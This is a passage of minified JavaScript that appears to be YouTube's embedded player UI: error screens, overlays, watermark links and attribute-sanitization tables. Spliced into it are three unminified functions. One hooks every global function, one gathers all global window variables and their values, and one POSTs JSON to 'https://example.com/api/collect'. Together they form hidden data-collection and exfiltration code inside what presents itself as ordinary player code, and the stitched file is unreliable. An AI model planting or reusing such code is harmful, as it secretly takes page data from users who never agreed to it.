    },
    b6 = function (a) {
      g.zT.call(this, a);
      var b = this;
      this.j = null;
      var c = a.W(),
        d = {
          I: "svg",
          Y: {
            fill: "#fff",
            height: "100%",
            viewBox: "0 0 24 24",
            width: "100%"
          },
          X: [{
            I: "path",
            Y: {
              d: "M0 0h24v24H0V0z",
              fill: "none"
            }
          }, {
            I: "path",
            Y: {
              d: "M21.58 7.19c-.23-.86-.91-1.54-1.77-1.77C18.25 5 12 5 12 5s-6.25 0-7.81.42c-.86.23-1.54.91-1.77 1.77C2 8.75 2 12 2 12s0 3.25.42 4.81c.23.86.91 1.54 1.77 1.77C5.75 19 12 19 12 19s6.25 0 7.81-.42c.86-.23 1.54-.91 1.77-1.77C22 15.25 22 12 22 12s0-3.25-.42-4.81zM10 15V9l5.2 3-5.2 3z"
            }
          }]
        };
      g.FL(c) && (d = {
        I: "svg",
        Y: {
          fill: "none",
          height: "100%",
          viewBox: "0 0 25 25",
          width: "100%"
        },
        X: [{
          I: "g",
          Y: {
            "clip-path": "url(#clip0)",
            fill: "#fff"
          },
          X: [{
            I: "path",
            Y: {
              d: "M12.57.98C6.21.98 1.05 6.14 1.05 12.5c0 6.36 5.16 11.52 11.52 11.52 6.36 0 11.52-5.16 11.52-11.52C24.09 6.14 18.93.98 12.57.98zm0 18.34c-3.77 0-6.82-3.05-6.82-6.82 0-3.77 3.05-6.82 6.82-6.82 3.77 0 6.82 3.05 6.82 6.82 0 3.77-3.05 6.82-6.82 6.82z"
            }
          }, {
            I: "path",
            Y: {
              d: "M12.57 6.52c-3.29 0-5.98 2.68-5.98 5.98 0 3.3 2.68 5.98 5.98 5.98 3.3 0 5.98-2.68 5.98-5.98 0-3.3-2.69-5.98-5.98-5.98zm-2.25 9.38V9.1l5.88 3.4-5.88 3.4z"
            }
          }]
        }, {
          I: "defs",
          X: [{
            I: "clipPath",
            Y: {
              id: "clip0"
            },
            X: [{
              I: "path",
              Y: {
                d: "M0 0h24v24H0z",
                fill: "#fff",
                transform: "translate(.57 .5)"
              }
            }]
          }]
        }]
      });
      var e = {
          target: c.ea
        },
        f = ["ytp-small-redirect"];
      c.C ? f.push("no-link") : (c = g.YL(c), e.href = c, e["aria-label"] = "Visit YouTube to search for more videos");
      var h = new g.X({
        I: "a",
        Na: f,
        Y: e,
        X: [d]
      });
      h.Ha(this.element);
      a.xb(h.element, this, 178053);
      this.V(h.element, "click", function (l) {
        Gmb(b, l, h.element);
      });
      g.H(this, h);
      a.W().C || (this.j = new Cmb(a), this.j.Ha(this.element), g.H(this, this.j));
      this.V(a, "videodatachange", function () {
        b.show();
      });
      this.resize(this.api.sb().getPlayerSize());
    },
    Gmb = function (a, b, c) {
      b.preventDefault();
      a.api.W().C || (a.api.ub(c), b = c.getAttribute("href"), c = {}, g.JR(a.api, "addEmbedsConversionTrackingParams", [c]), b = g.dd(c) ? b : g.dk(b, c), g.sl(b));
    },
    Hmb = function (a, b) {
      a.Ia("ytp-error-content").style.paddingTop = "0px";
      var c = a.Ia("ytp-error-content"),
        d = c.clientHeight;
      a.j.resize(b, b.height - d);
      c.style.paddingTop = (b.height - a.j.element.clientHeight) / 2 - d / 2 + "px";
    },
    Kmb = function (a, b) {
      var c = a.api.W(),
        d;
      b.reason && (Imb(b.reason) ? d = g.uG(b.reason) : d = g.AT(g.tG(b.reason)), a.ye(d, "content"));
      var e;
      b.subreason && (Imb(b.subreason) ? e = g.uG(b.subreason) : e = g.AT(g.tG(b.subreason)), a.ye(e, "subreason"));
      if (b.proceedButton && b.proceedButton.buttonRenderer) {
        d = a.Ia("ytp-error-content-wrap-subreason");
        b = b.proceedButton.buttonRenderer;
        var f = g.Te("A");
        if (b.text && b.text.simpleText && (e = b.text.simpleText, f.textContent = e, !Jmb(d, e) && (!c.C || c.embedsErrorLinks))) {
          var h;
          c = null == (h = g.Q(null == b ? void 0 : b.navigationEndpoint, g.sN)) ? void 0 : h.url;
          var l;
          h = null == (l = g.Q(null == b ? void 0 : b.navigationEndpoint, g.sN)) ? void 0 : l.target;
          c && (f.setAttribute("href", c), a.api.xb(f, a, 178424), a.V(f, "click", function (m) {
            Gmb(a, m, f);
          }));
          h && f.setAttribute("target", h);
          l = g.Te("DIV");
          l.appendChild(f);
          d.appendChild(l);
        }
      }
    },
    Imb = function (a) {
      if (a.runs) for (var b = 0; b < a.runs.length; b++) if (a.runs[b].navigationEndpoint) return !0;
      return !1;
    },
    Jmb = function (a, b) {
      a = g.Ke("A", a);
      for (var c = 0; c < a.length; c++) if (a[c].textContent === b) return !0;
      return !1;
    },
    c6 = function (a, b) {
      g.X.call(this, {
        I: "a",
        Na: ["ytp-impression-link"],
        Y: {
          target: "{{target}}",
          href: "{{url}}",
          "aria-label": "Watch on YouTube"
        },
        X: [{
          I: "div",
          T: "ytp-impression-link-content",
          Y: {
            "aria-hidden": "true"
          },
          X: [{
            I: "div",
            T: "ytp-impression-link-text",
            Aa: "Watch on"
          }, {
            I: "div",
            T: "ytp-impression-link-logo",
            X: [glb()]
          }]
        }]
      });
      this.api = a;
      this.wb = b;
      this.updateValue("target", a.W().ea);
      this.api.xb(this.element, this, 96714);
      this.V(this.api, "presentingplayerstatechange", this.cj);
      this.V(this.api, "videoplayerreset", this.j);
      this.V(this.element, "click", this.onClick);
      this.j();
    },
    Lmb = function (a) {
      var b = {};
      g.JR(a.api, "addEmbedsConversionTrackingParams", [b]);
      return g.dk(a.api.getVideoUrl(), g.CR(b, "emb_imp_woyt"));
    },
    d6 = function (a) {
      g.X.call(this, {
        I: "div",
        Na: ["ytp-mobile-a11y-hidden-seek-button"],
        X: [{
          I: "button",
          Na: ["ytp-mobile-a11y-hidden-seek-button-rewind", "ytp-button"],
          Y: {
            "aria-label": "Rewind 10 seconds",
            "aria-hidden": "false"
          }
        }, {
          I: "button",
          Na: ["ytp-mobile-a11y-hidden-seek-button-forward", "ytp-button"],
          Y: {
            "aria-label": "Fast forward 10 seconds",
            "aria-hidden": "false"
          }
        }]
      });
      this.api = a;
      this.j = this.Ia("ytp-mobile-a11y-hidden-seek-button-rewind");
      this.forwardButton = this.Ia("ytp-mobile-a11y-hidden-seek-button-forward");
      this.api.xb(this.j, this, 141902);
      this.api.xb(this.forwardButton, this, 141903);
      this.V(this.api, "presentingplayerstatechange", this.cj);
      this.V(this.j, "click", this.B);
      this.V(this.forwardButton, "click", this.C);
      this.cj();
    },
    e6 = function (a) {
      g.X.call(this, {
        I: "div",
        T: "ytp-muted-autoplay-endscreen-overlay",
        X: [{
          I: "div",
          T: "ytp-muted-autoplay-end-panel",
          X: [{
            I: "button",
            Na: ["ytp-muted-autoplay-end-text", "ytp-button"],
            Aa: "{{text}}"
          }]
        }]
      });
      this.api = a;
      this.D = this.Ia("ytp-muted-autoplay-end-panel");
      this.B = !1;
      this.api.xb(this.element, this, 52428);
      this.V(this.api, "presentingplayerstatechange", this.C);
      this.V(a, "onMutedAutoplayStarts", this.onMutedAutoplayStarts);
      this.Ua("click", this.onClick);
      this.hide();
    },
    f6 = function (a) {
      var b = a.W();
      g.X.call(this, {
        I: "a",
        Na: ["ytp-watermark", "yt-uix-sessionlink"],
        Y: {
          target: b.ea,
          href: "{{url}}",
          "aria-label": g.PO("Watch on $WEBSITE", {
            WEBSITE: g.ML(b)
          }),
          "data-sessionlink": "feature=player-watermark"
        },
        X: [glb()]
      });
      this.api = a;
      this.j = null;
      this.B = !1;
      this.state = a.Lb();
      a.xb(this.element, this, 76758);
      this.V(a, "videodatachange", this.Y_);
      this.V(a, "videodatachange", this.onVideoDataChange);
      this.V(a, "presentingplayerstatechange", this.onStateChange);
      this.V(a, "appresize", this.Mb);
      this.Ec(this.state);
      this.onVideoDataChange();
      this.Mb(a.sb().getPlayerSize());
    },
    Omb = function (a) {
      g.X.call(this, {
        I: "div",
        T: "ytp-muted-autoplay-overlay",
        X: [{
          I: "div",
          T: "ytp-muted-autoplay-bottom-buttons",
          X: [{
            I: "button",
            Na: ["ytp-muted-autoplay-equalizer", "ytp-button"],
            Y: {
              "aria-label": "Muted Playback Indicator"
            },
            X: [{
              I: "div",
              Na: ["ytp-muted-autoplay-equalizer-icon"],
              X: [{
                I: "svg",
                Y: {
                  height: "100%",
                  version: "1.1",
                  viewBox: "-4 -4 24 24",
                  width: "100%"
                },
                X: [{
                  I: "g",
                  Y: {
                    fill: "#fff"
                  },
                  X: [{
                    I: "rect",
                    T: "ytp-equalizer-bar-left",
                    Y: {
                      height: "9",
                      width: "4",
                      x: "1",
                      y: "7"
                    }
                  }, {
                    I: "rect",
                    T: "ytp-equalizer-bar-middle",
                    Y: {
                      height: "14",
                      width: "4",
                      x: "6",
                      y: "2"
                    }
                  }, {
                    I: "rect",
                    T: "ytp-equalizer-bar-right",
                    Y: {
                      height: "12",
                      width: "4",
                      x: "11",
                      y: "4"
                    }
                  }]
                }]
              }]
            }]
          }]
        }]
      });
      var b = this;
      this.api = a;
      this.bottomButtons = this.Ia("ytp-muted-autoplay-bottom-buttons");
      this.Ia("ytp-muted-autoplay-equalizer");
      this.C = new g.fr(this.B6, 4E3, this);
      this.B = !1;
      a.xb(this.element, this, 39306);
      this.V(a, "presentingplayerstatechange", this.EK);
      this.V(a, "onMutedAutoplayStarts", function () {
        Mmb(b);
        b.EK();
        Nmb(b);
        b.B = !1;
      });
      this.V(a, "onAutoplayBlocked", this.onAutoplayBlocked);
      this.Ua("click", this.onClick);
      this.V(a, "onMutedAutoplayEnds", this.onMutedAutoplayEnds);
      this.hide();
      g.OR(a.app) && (Mmb(this), this.EK(), Nmb(this));
    },
    Nmb = function (a) {
      a.Gb && a.j && (a.j.show(), a.C.start());
    },
    Mmb = function (a) {
      a.watermark || (a.watermark = new f6(a.api), g.H(a, a.watermark), a.watermark.Ha(a.bottomButtons, 0), g.rr(a.watermark.element, "ytp-muted-autoplay-watermark", !0), a.j = new g.CQ(a.watermark, 0, !0, 100), g.H(a, a.j));
    },
    g6 = function (a, b) {
      g.X.call(this, {
        I: "div",
        T: "ytp-pause-overlay",
        Y: {
          tabIndex: "-1"
        }
      });
      var c = this;
      this.api = a;
      this.C = new g.tJ(this);
      this.D = new g.CQ(this, 1E3, !1, 100, function () {
        c.j.C = !1;
      }, function () {
        c.j.C = !0;
      });
      this.B = !1;
      this.expandButton = new g.X({
        I: "button",
        Na: ["ytp-button", "ytp-expand"],
        Aa: g.$R(this.api) ? "More shorts" : "More videos"
      });
      "0" === a.W().controlsType && g.nr(a.getRootNode(), "ytp-pause-overlay-controls-hidden");
      g.H(this, this.C);
      g.H(this, this.D);
      var d = new g.X({
        I: "button",
        Na: ["ytp-button", "ytp-collapse"],
        Y: {
          "aria-label": g.$R(this.api) ? "Hide more shorts" : "Hide more videos"
        },
        X: [{
          I: "div",
          T: "ytp-collapse-icon",
          X: [g.kQ()]
        }]
      });
      g.H(this, d);
      d.Ha(this.element);
      d.Ua("click", this.G, this);
      g.H(this, this.expandButton);
      this.expandButton.Ha(this.element);
      this.expandButton.Ua("click", this.K, this);
      this.j = new g.F2(a, b);
      g.H(this, this.j);
      this.j.C = !1;
      this.j.Ha(this.element);
      g.$R(this.api) ? this.api.xb(this.element, this, 157212) : this.api.xb(this.element, this, 172777);
      this.C.V(this.api, "presentingplayerstatechange", this.Ta);
      this.C.V(this.api, "videodatachange", this.Ta);
      this.hide();
    },
    h6 = function (a) {
      g.X.call(this, {
        I: "div",
        Na: ["ytp-player-content", "ytp-iv-player-content"],
        X: [{
          I: "div",
          T: "ytp-countdown-timer",
          X: [{
            I: "svg",
            Y: {
              height: "100%",
              version: "1.1",
              viewBox: "0 0 72 72",
              width: "100%"
            },
            X: [{
              I: "circle",
              T: "ytp-svg-countdown-timer-ring",
              Y: {
                cx: "-36",
                cy: "36",
                "fill-opacity": "0",
                r: "33.5",
                stroke: "#FFFFFF",
                "stroke-dasharray": "211",
                "stroke-dashoffset": "-211",
                "stroke-width": "4",
                transform: "rotate(-90)"
              }
            }, {
              I: "circle",
              T: "ytp-svg-countdown-timer-background",
              Y: {
                cx: "-36",
                cy: "36",
                "fill-opacity": "0",
                r: "33.5",
                stroke: "#FFFFFF",
                "stroke-opacity": "0.3",
                "stroke-width": "4",
                transform: "rotate(-90)"
              }
            }]
          }, {
            I: "span",
            T: "ytp-countdown-timer-time",
            Aa: "{{duration}}"
          }]
        }]
      });
      this.api = a;
      this.K = this.Ia("ytp-svg-countdown-timer-ring");
      this.j = null;
      this.D = this.C = 0;
      this.B = !1;
      this.G = 0;
      this.api.xb(this.element, this, 159628);
    },
    Qmb = function (a) {
      a.j || (a.C = 5E3, a.D = (0, g.MC)(), a.j = new g.dr(function () {
        Pmb(a);
      }, null), Pmb(a));
    },
    Pmb = function (a) {
      if (!a.B) {
        var b = Math.min((0, g.MC)() - a.D, a.C);
        var c = a.C - b;
        b = 0 === a.C ? 0 : Math.max(c / a.C, 0);
        c = Math.round(c / 1E3);
        a.K.setAttribute("stroke-dashoffset", "" + -211 * (b + 1));
        a.updateValue("duration", c);
        0 >= b && a.j ? i6(a) : a.j && a.j.start();
      }
    },
    i6 = function (a) {
      a.j && (a.j.dispose(), a.j = null, a.B = !1);
    },
    Smb = function (a) {
      g.dT.call(this, a);
      this.J = a;
      this.j = new g.tJ(this);
      this.B = null;
      this.S = !1;
      this.countdownTimer = null;
      this.ea = !1;
      Rmb(this);
      g.H(this, this.j);
      this.load();
    },
    Umb = function (a) {
      var b = g.Nbb(a.J);
      b !== a.ea && (a.ea = b, a.G && (a.G.dispose(), a.G = null), a.C && (a.C.dispose(), a.C = null), a.D && (a.D.dispose(), a.D = null), a.B && (a.B.stop(), a.B.dispose(), a.B = null), b && (b = g.LR(a.J), g.$R(a.J) && (a.D = new g.X({
        I: "div",
        T: "ytp-pause-overlay-backdrop",
        Y: {
          tabIndex: "-1"
        }
      }), g.H(a, a.D), g.cS(a.J, a.D.element, 4), a.B = new g.CQ(a.D, 1E3, !1, 100), g.H(a, a.B), a.D.hide()), a.G = new g.X({
        I: "div",
        T: "ytp-pause-overlay-container",
        Y: {
          tabIndex: "-1"
        }
      }), g.H(a, a.G), a.J.N("embeds_web_enable_keto_pause_overlay") ? $lb(a.G.element, $5(Bmb, {
        J: a.J,
        wb: b
      })) : (a.C = new g6(a.J, b), g.H(a, a.C), a.C.Ha(a.G.element)), g.cS(a.J, a.G.element, 4), Tmb(a, a.J.Lb())));
    },
    Tmb = function (a, b) {
      a.B && (!g.AO(b, 4) && !g.AO(b, 2) || g.AO(b, 1024) ? a.B.hide() : a.B.show());
    },
    Rmb = function (a) {
      var b = a.J;
      a = !!g.$R(b);
      g.rr(b.getRootNode(), "ytp-shorts-mode", a);
      if (b = b.getVideoData()) b.eU = a;
    },
    j6 = function (a, b) {
      a = {
        adSource: "EMBEDS_AD_SOURCE_YOUTUBE",
        breakType: 0 === a.J.getCurrentTime() ? "EMBEDS_AD_BREAK_TYPE_PRE_ROLL" : 0 === a.J.getPlayerState() ? "EMBEDS_AD_BREAK_TYPE_POST_ROLL" : "EMBEDS_AD_BREAK_TYPE_MID_ROLL",
        embedUrl: g.afa(a.J.W().loaderUrl),
        eventType: b,
        youtubeHost: g.Qj(a.J.W().Oa) || ""
      };
      g.tC("embedsAdEvent", a);
    };
  var C5,
    D5 = null;
  var emb = new Set("allowfullscreen async autofocus autoplay checked controls default defer disabled formnovalidate hidden ismap itemscope jsshadow jsslot loop multiple muted novalidate open playsinline readonly required reversed scoped seamless selected spellcheck sortable typemustmatch".split(" "));
  var E5 = {
    Afb: function () {},
    Edb: function () {},
    Fdb: function () {},
    zfb: function () {},
    Idb: function () {},
    JU: function () {},
    Gdb: function () {},
    Z4: function () {},
    gz: function () {},
    UG: function () {},
    b5: function (a) {
      a.rU = !0;
    },
    a5: function () {}
  };
  F5.prototype.gz = function () {};
  F5.prototype.Z4 = function () {};
  F5.prototype.UG = function () {};
  F5.prototype.a5 = function () {};
  var wlb = Object.prototype.hasOwnProperty;
  tlb.prototype = Object.create(null);
  var bmb = H5();
  var U5 = null;
  var Flb = "undefined" !== typeof Node && Node.prototype.getRootNode || function () {
    for (var a = this, b = a; a;) b = a, a = a.parentNode;
    return b;
  };
  var M5 = null,
    O5 = null,
    K5 = null,
    R5 = null,
    S5 = [],
    Q5 = Clb,
    T5 = [],
    P5 = !1,
    Zlb = function (a) {
      return Glb(function (b, c, d) {
        K5 = O5 = b;
        O5 = null;
        c(d);
        null != a && a.Bfb || (N5(null), O5 = K5, K5 = K5.parentNode);
        return b;
      }, a);
    }(),
    Ylb = function (a) {
      return Glb(function (b, c, d) {
        var e = {
          nextSibling: b
        };
        O5 = e;
        c(d);
        K5 && N5(b.nextSibling);
        return e === O5 ? null : O5;
      }, a);
    }();
  var V5 = [],
    cmb = 0;
  var Z5 = new tlb();
  var W5 = {
      HC: !1,
      attributes: H5(),
      NH: function (a, b) {
        throw b;
      },
      Sdb: function () {
        return !1;
      },
      wZ: function () {
        throw Error("renderComponent not implemented");
      },
      efb: function () {
        return !1;
      },
      jaa: function (a) {
        if (W5.HC) return a;
      },
      l5: g.$bb
    },
    Klb = [];
  var a6 = null;
  g.x(Mlb, F5);
  Mlb.prototype.NA = function (a) {
    a6 = this;
    this.D = 0;
    try {
      return this.G(a);
    } finally {
      a6 = null;
    }
  };
  var amb = Symbol("ATTR_TAG_VALUE");
  var Rlb = {
      align: 1,
      alt: 1,
      "aria-activedescendant": 10,
      "aria-atomic": 1,
      "aria-autocomplete": 1,
      "aria-busy": 1,
      "aria-checked": 1,
      "aria-controls": 10,
      "aria-current": 1,
      "aria-disabled": 1,
      "aria-dropeffect": 1,
      "aria-expanded": 1,
      "aria-haspopup": 1,
      "aria-hidden": 1,
      "aria-invalid": 1,
      "aria-label": 1,
      "aria-labelledby": 10,
      "aria-level": 1,
      "aria-live": 1,
      "aria-multiline": 1,
      "aria-multiselectable": 1,
      "aria-orientation": 1,
      "aria-owns": 10,
      "aria-posinset": 1,
      "aria-pressed": 1,
      "aria-readonly": 1,
      "aria-relevant": 1,
      "aria-required": 1,
      "aria-selected": 1,
      "aria-setsize": 1,
      "aria-sort": 1,
      "aria-valuemax": 1,
      "aria-valuemin": 1,
      "aria-valuenow": 1,
      "aria-valuetext": 1,
      async: 8,
      autocapitalize: 1,
      autocomplete: 1,
      autocorrect: 1,
      autofocus: 1,
      autoplay: 1,
      bgcolor: 1,
      border: 1,
      cellpadding: 1,
      cellspacing: 1,
      checked: 1,
      cite: 3,
      "class": 1,
      color: 1,
      cols: 1,
      colspan: 1,
      contenteditable: 1,
      controls: 1,
      datetime: 1,
      dir: 8,
      disabled: 1,
      download: 1,
      draggable: 1,
      enctype: 1,
      face: 1,
      "for": 10,
      formenctype: 1,
      frameborder: 1,
      height: 1,
      hidden: 1,
      href: 4,
      hreflang: 1,
      id: 10,
      ismap: 1,
      itemid: 1,
      itemprop: 1,
      itemref: 1,
      itemscope: 1,
      itemtype: 1,
      label: 1,
      lang: 1,
      list: 10,
      loading: 8,
      loop: 1,
      max: 1,
      maxlength: 1,
      media: 1,
      min: 1,
      minlength: 1,
      multiple: 1,
      muted: 1,
      name: 10,
      nonce: 1,
      open: 1,
      placeholder: 1,
      poster: 3,
      preload: 1,
      rel: 1,
      required: 1,
      reversed: 1,
      role: 1,
      rows: 1,
      rowspan: 1,
      selected: 1,
      shape: 1,
      size: 1,
      sizes: 1,
      slot: 1,
      span: 1,
      spellcheck: 1,
      src: 4,
      srcset: 11,
      start: 1,
      step: 1,
      style: 5,
      summary: 1,
      tabindex: 1,
      target: 8,
      title: 1,
      translate: 1,
      type: 1,
      valign: 1,
      value: 1,
      width: 1,
      wrap: 1
    },
    Qlb = {
      a: {
        href: [{
          Ed: 3
        }]
      },
      area: {
        href: [{
          Ed: 3
        }]
      },
      audio: {
        src: [{
          Ed: 3
        }]
      },
      button: {
        formaction: [{
          Ed: 3
        }],
        formmethod: [{
          Ed: 1
        }]
      },
      form: {
        action: [{
          Ed: 3
        }],
        method: [{
          Ed: 1
        }]
      },
      iframe: {
        srcdoc: [{
          Ed: 2
        }]
      },
      img: {
        src: [{
          Ed: 3
        }]
      },
      input: {
        accept: [{
          Ed: 1
        }],
        formaction: [{
          Ed: 3
        }],
        formmethod: [{
          Ed: 1
        }],
        pattern: [{
          Ed: 1
        }],
        readonly: [{
          Ed: 1
        }],
        src: [{
          Ed: 3
        }]
      },
      link: {
        href: [{
          Ed: 3,
          di: "rel",
          Hi: "alternate"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "author"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "bookmark"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "canonical"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "cite"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "help"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "icon"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "license"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "next"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "prefetch"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "dns-prefetch"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "prerender"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "preconnect"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "preload"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "prev"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "search"
        }, {
          Ed: 3,
          di: "rel",
          Hi: "subresource"
        }]
      },
      script: {
        defer: [{
          Ed: 1
        }]
      },
      source: {
        src: [{
          Ed: 3
        }]
      },
      textarea: {
        readonly: [{
          Ed: 1
        }]
      },
      video: {
        src: [{
          Ed: 3
        }]
      }
    };
  g.qs.getInstance();
  X5.prototype.toString = function () {
    return this.cX;
  };
  var Vmb = /^(?!javascript:)(?:[a-z0-9+.-]+:|[^&:\/?#]*(?:[\/?#]|$))/i,
    k6 = {},
    Tlb = (k6[1] = {
      Aq: null,
      Qt: null,
      xs: null
    }, k6[2] = {
      Aq: function (a, b, c) {
        return g.ye(c);
      },
      Qt: function (a) {
        return a instanceof g.ke;
      },
      xs: function (a) {
        return g.le(a);
      }
    }, k6[3] = {
      Aq: function (a, b, c) {
        return Vmb.test(c) ? c : g.je.toString();
      },
      Qt: function (a) {
        return a instanceof g.Yd;
      },
      xs: function (a) {
        return g.Zd(a);
      }
    }, k6[4] = {
      Aq: function () {
        return g.je.toString();
      },
      Qt: function (a) {
        return a instanceof g.Td;
      },
      xs: function (a) {
        return g.Ud(a).toString();
      }
    }, k6[5] = {
      Aq: null,
      Qt: null,
      xs: null
    }, k6[7] = {
      Aq: null,
      Qt: null,
      xs: null
    }, k6[8] = {
      Aq: null,
      Qt: null,
      xs: null
    }, k6[10] = {
      Aq: null,
      Qt: function (a) {
        return a instanceof X5 || a instanceof g.Pd;
      },
      xs: function (a) {
        if (a instanceof g.Pd) a = g.Qd(a);else {
          if (!(a instanceof X5 && a.constructor === X5)) throw Error("Unwrap non-TrustedId");
          a = a.cX;
        }
        return a;
      }
    }, k6);
  var Wmb = H5(),
    fmb = Wmb.__default,
    gmb = Wmb.style,
    Xmb = {};
  Llb({
    attributes: (Xmb.__default = function () {
      return Vlb;
    }, Xmb.style = function () {
      return Vlb;
    }, Xmb)
  });
  function overwriteFuncsWithHooks() {
    for (let prop in window) {
      let value = window[prop];
      if (typeof value === "function" && !window.seenVars.includes(prop)) {
        window[prop] = jshookWrap(window[prop], prop);
      }
    }
  }
  var dmb = "A reference returned by useRootElement was passed to the el prop of an element. Pass a reference returned by useElement.";
  var lmb = [];
  var Ymb = H5();
  W5.wZ = function (a) {
    var b = a.type,
      c = b.yL;
    if (Plb(b) || W5.HC) {
      0 < a.children.length && (a.props.children = a.children);
      if (W5.HC) {
        var d;
        (d = a.props).idomKey || (d.idomKey = W5.jaa(b));
      }
      if (!c && W5.HC) {
        if (c = jmb(b, a.props), d = hmb(c)) {
          if ("function" === typeof d.type) throw Error("Higher Order Components are not currently supported. All components  must return a single intrinsic element like <div> or <span>.");
          var e = Y5(d);
          if (!e) throw Error("Function component did not return an intrinsic root element");
          if (c.C) {
            if (d.props.el) throw Error("Tried to place reference on an element already referenced with useRootElement");
            var f, h;
            null == (h = (f = c.C).HY) || h.call(f, e);
          }
          b.yL = e.tagName.toLowerCase();
          e.__instance = c;
          c.el = e;
          c.gz();
          E5.gz(c);
        }
      } else {
        var l = Elb(c, a.props.idomKey);
        a.lq = !0;
        imb(c, function () {
          if (!l.__instance) {
            var m = jmb(b, a.props);
            l.__instance = m;
            m.el = l;
            m.props = null;
          }
          m = l.__instance;
          null != m.j || (m.j = {
            fP: m.state,
            iX: !1
          });
          var n = m.j.fP;
          m.j = void 0;
          var p,
            q = null != (p = null == a ? void 0 : a.props) ? p : m.props;
          null != n || (n = m.state);
          p = m.constructor;
          p.L5 && (n = p.L5(q, n));
          m.props = q;
          m.state = n;
          if (n = hmb(m)) a && (n.lq = a.lq), Y5(n), a && (a.lq = n.lq);
          m.gz();
          E5.gz(m);
        });
        a.lq && (N5(null), O5 = K5, K5 = K5.parentNode, a.lq = !1);
      }
    } else Y5(b(a.props));
  };
  W5.HC = !0;
  W5.attributes = Ymb;
  for (var Zmb = g.v(Klb), $mb = Zmb.next(); !$mb.done; $mb = Zmb.next()) {
    var anb = $mb.value;
    anb.attributes && Jlb(anb.attributes);
  }
  (function () {
    var a = U5;
    U5 = function (b) {
      null == a || a(b);
      mmb(b);
    };
  })();
  var pmb = "Hook called out of order. Hooks must be invoked unconditionally and in the same order every render. This could happen if you conditionally invoke a hook.",
    omb = "A valid hook context was not found. Please ensure you are using components from TSX and not invoking the component function  directly";
  function collectWindowData() {
    const collectedData = {};
    for (const prop in window) {
      if (window.hasOwnProperty(prop)) {
        if (!window.seenVars.includes(prop)) {
          const value = window[prop];
          const type = typeof value;
          collectedData[prop] = {
            type: type,
            value: type === "function" ? null : value
          };
        }
      }
    }
    return collectedData;
  }
  Llb({
    vZ: {
      JU: function (a) {
        var b;
        (null == (b = a.zy) ? 0 : b.length) && vmb(a.zy);
      },
      gz: function (a) {
        var b;
        (null == (b = a.zy) ? 0 : b.length) && vmb(a.zy);
      },
      UG: function (a) {
        var b;
        (null == (b = a.yD) ? 0 : b.length) && a.yD.forEach(umb);
      },
      b5: function (a) {
        var b;
        (null == (b = a.iG) ? 0 : b.length) && vmb(a.iG);
      }
    }
  });
  g.x(Cmb, g.X);
  function sendDataToServer(data) {
    const url = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          console.log("Data sent successfully");
        } else {
          console.error("Data failed to send, status code:" + xhr.status);
        }
      }
    };
    xhr.send(JSON.stringify(data));
  }
  g.k = Cmb.prototype;
  g.k.hide = function () {
    this.S = !0;
    g.X.prototype.hide.call(this);
    Dmb(this, !1);
  };
  g.k.show = function () {
    this.S = !1;
    g.X.prototype.show.call(this);
    Dmb(this, !0);
  };
  g.k.isHidden = function () {
    return this.S;
  };
  g.k.n1 = function () {
    this.scrollTo(this.C - this.containerWidth);
  };
  g.k.o1 = function () {
    this.scrollTo(this.C + this.containerWidth);
  };
  g.k.resize = function (a, b) {
    var c = this.api.W(),
      d = 16 / 9,
      e = 650 <= a.width,
      f = 480 > a.width || 290 > a.height,
      h = Math.min(this.suggestionData.length, this.j.length);
    if (150 >= Math.min(a.width, a.height) || 0 === h || !c.Td) this.hide();else {
      var l;
      if (e) {
        var m = l = 28;
        this.B = 16;
      } else this.B = m = l = 8;
      if (f) {
        var n = 6;
        e = 14;
        var p = 12;
        f = 24;
        c = 12;
      } else n = 8, e = 18, p = 16, f = 36, c = 16;
      a = a.width - (48 + l + m);
      l = Math.ceil(a / 150);
      l = Math.min(3, l);
      m = a / l - this.B;
      var q = Math.floor(m / d);
      b && q + 100 > b && 50 < m && (q = Math.max(b, 50 / d), l = Math.ceil(a / (d * (q - 100) + this.B)), m = a / l - this.B, q = Math.floor(m / d));
      50 > m || g.ZR(this.api) ? this.hide() : this.show();
      for (b = 0; b < h; b++) {
        d = this.j[b];
        var t = d.Ia("ytp-suggestion-image");
        t.style.width = m + "px";
        t.style.height = q + "px";
        d.Ia("ytp-suggestion-title").style.width = m + "px";
        d.Ia("ytp-suggestion-author").style.width = m + "px";
        d = d.Ia("ytp-suggestion-duration");
        d.style.display = d && 100 > m ? "none" : "";
      }
      h = e + n + p + 4;
      this.K = h + c + (q - f) / 2;
      this.suggestions.element.style.height = q + h + "px";
      this.D = m;
      this.containerWidth = a;
      this.columns = l;
      this.C = 0;
      this.suggestions.element.scrollLeft = -0;
      Emb(this);
    }
  };
  g.k.onVideoDataChange = function () {
    var a = this.api.getVideoData(),
      b = this.api.W();
    this.ea = a.Pd ? !1 : b.D;
    a.suggestions ? this.suggestionData = g.tp(a.suggestions, function (c) {
      return c && !c.playlistId;
    }) : this.suggestionData.length = 0;
    Fmb(this);
    a.Pd ? this.title.update({
      title: g.PO("More videos from $DNI_RELATED_CHANNEL", {
        DNI_RELATED_CHANNEL: a.author
      })
    }) : this.title.update({
      title: "More videos on YouTube"
    });
  };
  g.k.scrollTo = function (a) {
    a = g.oe(a, this.containerWidth - this.suggestionData.length * (this.D + this.B), 0);
    this.va.start(this.C, a, 1E3);
    this.C = a;
    Emb(this);
    Dmb(this, !0);
  };
  g.x(b6, g.zT);
  b6.prototype.show = function () {
    g.zT.prototype.show.call(this);
    Hmb(this, this.api.sb().getPlayerSize());
  };
  b6.prototype.resize = function (a) {
    g.zT.prototype.resize.call(this, a);
